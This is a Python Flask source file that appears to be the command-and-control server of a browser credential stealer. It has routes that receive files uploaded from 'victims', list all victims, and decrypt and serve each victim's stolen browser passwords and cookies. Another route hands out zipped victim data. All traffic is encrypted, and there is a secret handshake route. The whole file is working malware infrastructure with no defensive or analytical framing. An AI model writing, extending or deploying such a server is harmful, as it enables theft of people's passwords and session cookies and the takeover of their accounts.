from flask import Flask, request, Response
from models.victim import Victim
from models.crypto import CryptoOps


app = Flask(__name__)

crypt = CryptoOps()


def SendAsChunks(buffer, ChunkSize):
    """
    Sends a big buffer chunk by chunk.
    args:
        @buffer (Any): buffer that will be sent.
        @ChunkSize (int): the chunk size.
    """
    for i in range(0, len(buffer), ChunkSize):
        yield buffer[i:i + ChunkSize]


@app.route("/up", methods=["POST"])
def up():
    """
    Route for uploading files, the file then will be handled by the Victim class.
    """
    VictimIP = request.headers.get("X-Real-IP")
    CurrentVictim = Victim(VictimIP)
    NameHeader = request.headers.get("name")
    if NameHeader is None or len(request.data) == 0:
        return '', 400

    FilePath = CurrentVictim.GetFileStoragePath(NameHeader)

    dataout = open(FilePath, 'wb')
    dataout.write(request.data)
    dataout.close()

    return '', 200


@app.route("/check", methods=["GET"])
def check():
    """
    route to check the cryptographic parameters.
    """
    message = request.headers.get("cc")
    message = crypt.DecryptBuffer(message)
    if message == "Are you ready?":
        response = crypt.EncryptBuffer("yes daddy.")
        response = {"cc": response}

        return "", 200, response
    else:
        return "", 400


@app.route("/GetAll", methods=["GET"])
def GetAll():
    """
    route for getting all victims detals

    return:
        List[dict] = list of dicts each contains information about victim's info
    """
    data = Victim(None).AllVictims
    data = crypt.EncryptBuffer(data)
    return Response(data, mimetype="text/plain", status=200)


@app.route("/GetVictimData", methods=["GET"])
def GetVictimData():
    """
    route to get a single victim browsers data.

    return:
        dict[list]: dict contains all browser data (passwords and cookies)
    """
    VictimIP = request.headers.get("TARGET")
    if VictimIP is not None:

        def GetKey(browser):
            KeyPath = CurrentVictim.GetFilePath(str(browser + 1), "KEY")

            file = open(KeyPath, "rb")
            key = file.read()
            file.close()

            return key

        def DecryptAndFormat(data, browser):
            key = GetKey(browser)

            for i in range(len(data)):
                NewData = []
                DataLen = len(data[i])
                for j in range(DataLen):
                    if j != (DataLen - 1):
                        NewData.append(data[i][j])
                PlainTextValue = crypt.DecryptBrowserCipher(key, data[i][-1])
                if PlainTextValue == b'':
                    PlainTextValue = "EMPTY"
                else:
                    PlainTextValue = PlainTextValue.decode("utf-8")
                NewData.append(PlainTextValue)
                data[i] = NewData

        VictimIP = crypt.DecryptBuffer(VictimIP)
        CurrentVictim = Victim(VictimIP)

        if CurrentVictim.IsNew is True:
            return 'The requested victim does not exist', 204

        VictimData = CurrentVictim.GetVictimBrowserData()

        passwords = VictimData["PASSWORDS"]
        cookies = VictimData["COOKIES"]

        for browser in range(CurrentVictim.CurrentVictim["BrowserCount"]):
            data = passwords[browser]
            DecryptAndFormat(data, browser)
            passwords[browser] = data

            data = cookies[browser]
            DecryptAndFormat(data, browser)
            cookies[browser] = data

        VictimData = crypt.EncryptBuffer(VictimData)

        return Response(SendAsChunks(VictimData, 102400), status=200, content_type='text/plain')

    return 'sir t9awd', 400


@app.route("/down", methods=["GET"])
def down():
    """
    route for downloading all victims data

    return:
        bytes = encrypted zip file.
    """
    VictimIP = request.headers.get("TARGET")
    if VictimIP is not None:
        VictimIP = crypt.DecryptBuffer(VictimIP)
        CurrentVictim = Victim(VictimIP)

        if CurrentVictim.IsNew is True:
            return 'The requested victim does not exist', 204

        FileName = CurrentVictim.ZipVictimFolder()
        file = open(FileName, "rb")
        data = crypt.EncryptBuffer(file.read())
        file.close()
        CurrentVictim.RemoveVictimZip()

        return Response(SendAsChunks(data, 102400), status=200, content_type='text/plain')

    return 'sir t9awd', 400


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=1133, debug=True)
